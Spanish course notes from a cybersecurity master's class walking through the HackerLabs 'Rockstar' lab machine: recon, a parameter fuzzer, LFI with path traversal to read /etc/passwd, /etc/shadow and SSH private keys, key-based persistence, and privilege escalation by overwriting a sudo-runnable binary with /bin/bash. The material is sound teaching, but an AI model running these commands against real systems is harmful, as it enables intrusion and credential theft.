> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 40**
> **Módulo:** MODULO3
> **Tema:** Clase 40
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 40. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

---

--
**Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesión

Esta sesión la imparte **Carlos (Dani)**, retomando directamente la máquina **Rockstar** de HackerLabs donde se dejó en la Clase 39.

La dinámica es interactiva: el profesor ejecuta con pantalla compartida mientras el grupo comenta, pregunta y sigue en paralelo.

**Estado inicial al comenzar la clase:** - Tenemos RCE a través de la shell web en `/dev/bas.php`. - Usuario: `www-data`. - La máquina tiene múltiples usuarios reales (Shark, VBRs, layms, username, root), lo que apunta a una cadena de movimiento lateral --- similar a un mini Active Directory.

**Anécdota técnica de apertura:** Castillo mencionó que alguien había extraído el "razonamiento" de Claude Opus 4.8 y lo había usado para mejorar el modelo de Google DeepMind (Gemini/Fable 5).

El modelo entrenado no tenía la potencia completa pero sí una mejora del 20-30% sobre la versión base.

## 2.

Repaso de la Clase 39 --- flujo completo hasta la shell

### Reconocimiento y fuzzing de directorios

# Flujo estándar

```bash
sudo netdiscover -r 10.0.2.0/24 # Descubrir IP de la víctima nmap -sCV 10.0.2.9 # Puertos: 22 (SSH) y 80 (HTTP) dirsearch -u http://10.0.2.9/ -x php,html # Buscar ficheros PHP
```

# Hallazgo: /php/index.php y /dev/ con bas.php y php.min.jpg

### Cuándo fusear parámetros y cuándo no

> [!important] **Regla clave:** solo tiene sentido fusear parámetros en ficheros que interactúen con el backend del servidor.

Nunca en HTML:

Extensión ¿Interactúa con backend? ¿Fusear parámetros?
 ------------------ -------------------------- --------------------
 `.html` NO --- solo frontend ❌ No tiene sentido
 `.php` SÍ ✅ Sí
 `.asp` / `.aspx` SÍ ✅ Sí
 `.js` Depende (Node.js = sí) ✅/❌
 `.java` SÍ ✅ Sí

**Por qué HTML no:** un fichero `.html` solo modifica clases y elementos del frontend (lo que ve el usuario).

Los parámetros que se le pasen nunca llegan al servidor, por lo que cualquier respuesta que obtengamos es irrelevante para el ataque.

### El fuzzer propio con Claude + descubrimiento del parámetro `backdoor`

Como la herramienta `x8` no funcionaba, el grupo usó Claude para crear un **fuzzer binario en Python** que: 1.

Lee un diccionario de parámetros (common.txt de DirBuster: `/usr/share/wordlists/dirb/common.txt`). 2.

Lanza una petición POST a `index.php` con cada parámetro del diccionario via `curl -X POST -d PARAMETRO=test`. 3.

Comprueba si la respuesta cambia respecto a la respuesta base → si cambia, ese parámetro existe y el servidor lo procesa.

**Resultado:** parámetro `backdoor` descubierto → al enviar `backdoor=db.php`, el servidor incluye el fichero `db.php` en la respuesta.

### LFI --- Local File Inclusion

El parámetro `backdoor` carga ficheros del servidor.

Si no se valida correctamente, permite leer cualquier fichero usando `../` (Path Traversal):

# Leer el /etc/passwd del servidor

```bash
curl -X POST -d 'backdoor=../../../../etc/passwd' http://10.0.2.9/php/index.php
```

**Resultado:** contenido completo del `/etc/passwd`.

Con esto se puede: - Ver qué usuarios tienen `/bin/bash` (usuarios reales con terminal). - Ver las cuentas de servicio con `nologin` (las ignoramos). - Ya tenemos acceso a credenciales de la BD y podemos conectar por SSH directamente --- el LFI en este punto es informativo pero no el vector principal.

**Usuarios reales encontrados:** `root`, `shark`, `VBRs`, `layms`, `username`.

La presencia de múltiples usuarios reales indica una **cadena de pivoting**: `shark → VBRs → layms → username → root`.

## 3.

Acceso SSH como Shark --- shell estabilizada por defecto

Con las credenciales de `shark` obtenidas del fichero `db.php`:

```bash
ssh shark@10.0.2.9
```

# Contraseña: obtenida de db.php

whoami # → shark pwd # → /home/shark uname -a # → versión del kernel (importante para buscar exploits de escalada)

**Ventaja crítica del SSH sobre la webshell o reverse shell:**

La shell SSH ya viene **estabilizada por defecto** --- tiene historial, autocompletado, Ctrl+C funciona correctamente, puede usar editores de texto.

No es necesario hacer el proceso manual de `python3 pty + stty raw -echo + export TERM`.

### Truco de persistencia con claves RSA (en vez de python3 pty)

Alternativa más elegante para estabilizar y persistir el acceso cuando se entra por reverse shell:

# Una vez dentro como el usuario comprometido:

```bash
ssh-keygen -t rsa -f ~/.ssh/id_rsa # Generar par de claves (sin passphrase) cat ~/.ssh/id_rsa # Copiar la clave privada
```

# Enviar la clave privada a nuestra máquina Kali (por netcat, wget, etc.)

# Desde Kali:

```bash
chmod 600 id_rsa_robada ssh -i id_rsa_robada shark@IP_VICTIMA # Conexión estable como shark
```

**Por qué es mejor:** la conexión SSH resultante es completamente estable y persistente.

Si la webshell cae, el acceso SSH permanece.

Es también la técnica de persistencia más limpia y menos ruidosa.

## 4.

Escalada de privilegios --- `uname -a` y CVEs de kernel

uname -a

# Devuelve: versión del kernel de Linux

**Por qué siempre lanzar** `uname -a`**:**

Carlos comenta que en Cibersia Security están viendo un 0-day nuevo de escalada de privilegios en Linux cada pocas semanas.

Con la versión del kernel se puede buscar exploits públicos en Exploit-DB o consultar a Claude.

**En este laboratorio:** los CVEs del kernel de 2025 no aplican porque la máquina es reciente y está parcheada.

Si hubiera un kernel antiguo (ej. 4.x), habría opciones directas.

**Secuencia de comandos al comprometer una máquina:**

whoami # ¿Quién soy? pwd # ¿Dónde estoy? uname -a # ¿Qué versión del kernel tiene? → buscar CVEs sudo -l # ¿Qué puedo ejecutar como otro usuario?

## 5.

Permisos de Linux en profundidad --- repaso completo

Surgió porque el grupo tenía dudas con los permisos al analizar el binario `bov`.

Carlos dedicó una parte de la clase a explicarlo desde cero.

### Estructura de permisos en el output de `ls -la`

 -rwxr-xr-- 1 shark www-data 8432 Jun 15 10:00 bov
↑↑↑↑↑↑↑↑↑↑ ↑ ↑ ↑ ↑ ↑ 1234567890 owner group size fecha nombre

**El primer carácter (tipo de objeto):**

Carácter Significado
 ---------- ------------------------
 `-` Fichero regular
 `d` Directorio
 `l` Enlace simbólico (link)
 `s` Socket

**Los 9 caracteres siguientes se dividen en 3 tríos:**

Posición Trío A quién aplica
 ---------- ------- ----------------------------------------------
2-4 `rwx` **Owner** (propietario del fichero) 5-7 `rwx` **Group** (grupo al que pertenece el fichero) 8-10 `rwx` **Others** (todos los demás)

**Significado de cada letra:**

Letra Permiso Valor binario Valor decimal
 ------- --------------------- --------------- --------------
 `r` Read (lectura) 2² = 4 **4**
 `w` Write (escritura) 2¹ = 2 **2**
 `x` Execute (ejecución) 2⁰ = 1 **1**
 `-` Sin permiso 0 **0**

### Cómo funciona `chmod` con números octales

Los permisos se representan como la suma de los valores activos:

Número Binario Permisos
 -------- --------- ------------------------------
 **0** 000 Sin permisos
 **1** 001 Solo ejecución (`--x`)
 **2** 010 Solo escritura (`-w-`)
 **3** 011 Escritura + ejecución (`-wx`)
 **4** 100 Solo lectura (`r--`)
 **5** 101 Lectura + ejecución (`r-x`)
 **6** 110 Lectura + escritura (`rw-`)
 **7** 111 Todo (`rwx`)

**Ejemplo:** `chmod 755 fichero` - `7` → Owner: rwx (lectura + escritura + ejecución) - `5` → Group: r-x (lectura + ejecución) - `5` → Others: r-x (lectura + ejecución)

`chmod 777` = todo para todos --- una aberración de seguridad.

Nunca en producción.

**La columna de fecha** en `ls -la` no es la fecha de creación --- es la **última vez que el fichero fue accedido, modificado o ejecutado**.

En forense, esto es información relevante.

## 6.

Escalada de privilegios --- sobreescritura de binario con permisos de escritura

### Hallazgo: el binario `bov` en el home de shark

```bash
ls -la /home/shark/
```

# → bov (verde = ejecutable)

```bash
ls -lh /home/shark/bov
```

# → -rwxrwxr-x 1 shark www-data ... bov

El verde en `ls` indica que el fichero es **ejecutable** para el usuario actual.

### Leer el binario compilado

```bash
cat /home/shark/bov
```

# → ilegible (bytes compilados, no texto ASCII)

Los ejecutables compilados (C, C++...) no son legibles con `cat`.

La compilación convierte el código fuente a lenguaje máquina (bytes).

Para leer algo de un binario compilado se usa `strings`:

strings /home/shark/bov

# → cadenas de texto legibles embebidas en el ejecutable

### Al ejecutarlo:

./bov

# → "overflow me" — el binario espera input para provocar un buffer overflow

### `sudo -l` como shark

```bash
sudo -l
```

# → shark puede ejecutar /home/shark/bov como www-data (NOPASSWD)

**Traducción:** shark puede ejecutar `bov` suplantando a `www-data` sin contraseña.

### La regla de oro para escalar privilegios

> **Si tienes permiso de escritura sobre un fichero que puedes ejecutar suplantando a otro usuario → tienes escalada de privilegios garantizada.**

# Verificar permisos de escritura sobre bov:

```bash
ls -lh /home/shark/bov
```

# → rwxrwxr-x → el grupo (www-data) tiene escritura (w)

# Nosotros somos shark, y shark pertenece al grupo www-data → ¡tenemos escritura!

### Explotación: sobreescribir el binario con una shell Bash

El contenido del binario no importa.

Lo que importa es que cuando se ejecute como `www-data`, lance una shell interactiva como ese usuario:

# Sobreescribir el contenido del binario con una llamada a bash:

```bash
echo '/bin/bash' > /home/shark/bov
```

# Verificar que se ha sobreescrito:

```bash
cat /home/shark/bov
```

# → /bin/bash

# Ejecutar el binario suplantando a www-data:

```bash
sudo -u www-data /home/shark/bov
```

# Resultado:

whoami # → www-data

### La analogía del profesor

> "Si yo puedo ir a casa de Charchas y pedir un Bollicao como si fuera él, me lo van a dar.

Pero si además puedo cambiar el menú, ya en vez del Bollicao que no sé qué tiene, le pongo unas lentejas con chorizo que me apetecen más.

Me las traen como si fuera él, pero las como yo."

### Diferencia entre `>` y `>>` en la sobreescritura

- `echo 'contenido' > fichero` → **sobrescribe** el contenido entero del fichero.
- `echo 'contenido' >> fichero` → **añade** al final sin borrar el contenido existente.

En este ataque usamos `>` para eliminar el binario original y poner solo nuestra shell.

## 7.

Pivoting entre usuarios con sudo -u

Una vez convertidos en `www-data`, continuar con el mismo patrón:

whoami # www-data sudo -l # ¿Qué puede ejecutar www-data como otro usuario?

# Buscar binario/script ejecutable con permisos de escritura

# Si lo hay → sobreescribir con /bin/bash → ejecutar como el siguiente usuario

El flujo completo de la máquina sigue la cadena:

shark → (sobreescribir bov) → www-data → (buscar siguiente vector) → ... → root

**Por qué es parecido a Active Directory:** en AD el movimiento lateral salta entre cuentas del dominio.

Aquí, aunque sea Linux, la lógica es la misma --- cada usuario tiene permisos distintos que permiten llegar al siguiente escalón.

## 8.

Herramienta `x8` --- enumeración de parámetros ocultos

**x8** es la herramienta estándar para descubrir parámetros ocultos en ficheros web.

Funciona de forma similar al fuzzer que construimos con Claude, pero más optimizada:

# Instalación (si no está disponible):

# Buscar en el repositorio GitHub oficial: sh1yo/x8

# Uso básico:

x8 -u "http://IP/php/index.php" -w /usr/share/wordlists/dirb/common.txt -X POST

Cuando `x8` no esté disponible en el laboratorio, la alternativa es construir el fuzzer con Claude:

# Fuzzer binario básico (generado por Claude en clase):

import requests with open('/usr/share/wordlists/dirb/common.txt') as f: params = f.read().splitlines()

base_response = requests.post('http://IP/php/index.php', data={'test': 'test'}).text

for param in params: r = requests.post('http://IP/php/index.php', data={param: 'test'}) if r.text != base_response: print(f'[+] Parámetro encontrado: {param}')

## 9.

Path Traversal --- combinación con LFI

Cuando se tiene un parámetro vulnerable a LFI (que incluye ficheros del servidor), se puede combinar con **Path Traversal** (`../`) para salir del directorio del servidor web y leer ficheros del sistema:

backdoor=../../../../etc/passwd → Leer /etc/passwd backdoor=../../../../etc/shadow → Leer /etc/shadow (si se tienen permisos) backdoor=../../../../home/shark/.ssh/id_rsa → Robar clave SSH privada

**La cantidad de** `../` **da igual** si son suficientes --- el sistema para al llegar a la raíz.

Usando muchos `../` siempre se parte desde la raíz independientemente de la profundidad real del directorio.

## 10.

Flujo completo de la máquina Rockstar hasta www-data

netdiscover → IP: 10.0.2.9 ↓ nmap -sCV → puertos 22 (SSH) y 80 (HTTP) ↓ dirsearch -u http://10.0.2.9/ -x php,html → /dev/ con bas.php y php.min.jpg ↓ Análisis de código fuente (php.min.jpg) → enviar a Claude → RCE sin autenticación ↓ Shell web en /dev/bas.php → whoami: www-data → ls: /var/www/html ↓ Fuzzer (x8 o Claude) → parámetro backdoor en index.php ↓ backdoor=db.php → credenciales de shark en texto claro ↓ backdoor=../../../../etc/passwd → usuarios del sistema (shark, VBRs, layms, username, root) ↓ ssh shark@10.0.2.9 → shell estabilizada → whoami: shark ↓ sudo -l → shark puede ejecutar /home/shark/bov como www-data ls -lh bov → grupo tiene escritura (rwxrwxr-x) echo '/bin/bash' > /home/shark/bov sudo -u www-data /home/shark/bov → whoami: www-data ↓ [continuar con sudo -l como www-data → siguiente usuario → ... → root]

## 11.

Conceptos y términos clave corregidos

Término en la transcripción Corrección / Aclaración
--------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------
 *Rockstar / Rockestra* **Rockstar** -- máquina de HackerLabs (web + escalada de privilegios por sobreescritura de binario)
 *backdoor / Back Door / baquerido* `backdoor` -- parámetro oculto vulnerable a LFI encontrado mediante fuzzing
*Path Traversal / transversal Path* **Path Traversal** -- técnica que usa `../` para navegar fuera del directorio permitido y leer ficheros del sistema
 *Local File Inclusing / LFI* **LFI** (*Local File Inclusion*) -- vulnerabilidad que permite leer ficheros del servidor mediante un parámetro de URL
 *el bov / el Bob / el Bov* `bov` -- nombre del binario ejecutable vulnerable en `/home/shark/`
*buffer overflow / over flow / el desbordamiento* **Buffer Overflow** -- vulnerabilidad que consiste en desbordar la memoria de un programa con más datos de los esperados
 *keyheim / el de la clave / par de RSA* `ssh-keygen -t rsa` -- comando para generar un par de claves SSH (pública y privada)
 *punto SSH slash ID RSA* `~/.ssh/id_rsa` -- clave privada SSH; `~/.ssh/authorized_keys` = claves públicas autorizadas
 *sudo guión l / sudo menos l* `sudo -l` -- lista los comandos que el usuario actual puede ejecutar suplantando a otro usuario
 *sudo guión u / suplantar usuario* `sudo -u USUARIO` -- ejecutar un comando suplantando a un usuario específico
 *el ww data / www tal* `www-data` -- cuenta de servicio del servidor web Apache/Nginx
 *owner / propietario / el mío* **Owner** -- propietario del fichero (primer trío de permisos en Linux)
 *group / grupo* **Group** -- grupo al que pertenece el fichero (segundo trío de permisos)
 *Odes / Orders / other* **Others** -- todos los demás usuarios (tercer trío de permisos)
 *el rwx / RWX* `rwx` -- read (4) + write (2) + execute (1); los tres permisos básicos de Linux
 *chaid mode / cheamode / el change mode* `chmod` (*change mode*) -- comando para cambiar los permisos de un fichero
 *el 7 5 5 / el de los permisos numéricos* `chmod 755` -- Owner: todo (rwx), Group y Others: lectura+ejecución (r-x)
 *el 7 7 7 / el de dar todo* `chmod 777` -- todos los permisos para todos; considerado una aberración de seguridad
 *uname a / uname menos a* `uname -a` -- muestra la versión completa del kernel de Linux; útil para buscar CVEs de escalada
 *el eco más el mayor / el redirect* `echo 'contenido' > fichero` -- sobrescribe el fichero con el nuevo contenido
 *mayor mayor / el doble mayor* `echo 'contenido' >> fichero` -- añade al final del fichero sin borrar el contenido existente
 *HackerLab / Hacker Labs / hackerlabs* **HackerLabs** (hackerlabs.academy) -- plataforma de máquinas vulnerables para práctica
 *x 8 / x ocho / la de los parámetros* **x8** -- herramienta para enumerar parámetros ocultos en ficheros web
*Fable 5 / DeepMind / Gemini* **Google DeepMind / Gemini** -- equipo e IA de Google (anécdota sobre el entrenamiento con el razonamiento de Claude Opus 4.8)
 *Claudia / Claudio / cloud / la IA* **Claude** (Anthropic) -- IA usada para crear el fuzzer de parámetros y buscar exploits de kernel

*Resumen elaborado para uso académico en el Máster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*

---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Andres/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]— Escalada de Privilegios, Kali Linux, SSH
- [[../../transcripciones/Julio/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]— Escalada de Privilegios, Kali Linux, SSH
- [[../../apuntes Andres/07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote.md|07.07.2026 Explotación Avanzada - Escalada de Privilegios MultiPivote]— Escalada de Privilegios, Kali Linux, SSH
- [[../../transcripciones/Julio/07.07.2026 Explotación Avanzada Fuzzing de Parámetros II y Escalada de Privilegios MultiPivote.md|07.07.2026 Explotación Avanzada Fuzzing de Parámetros II y Escalada de Privilegios MultiPivote]— Escalada de Privilegios, Kali Linux, SSH
- [[../MODULO1/resumen_master_clase2.md|resumen_master_clase2]— Escalada de Privilegios, Kali Linux, Redes
- [[resumen_master_clase35.md|resumen_master_clase35]— Escalada de Privilegios, Kali Linux, Redes

### 🛠️ Herramientas

- [[comandos/DirSearch|DirSearch]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]
- [[comandos/SSH|SSH]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]

> #command-injection #dirsearch #escalada-privilegios #file-upload #forense #ia #kali #lfi #linux #netcat #nmap #pivoting #redes #reverse-shell #ssh #windows
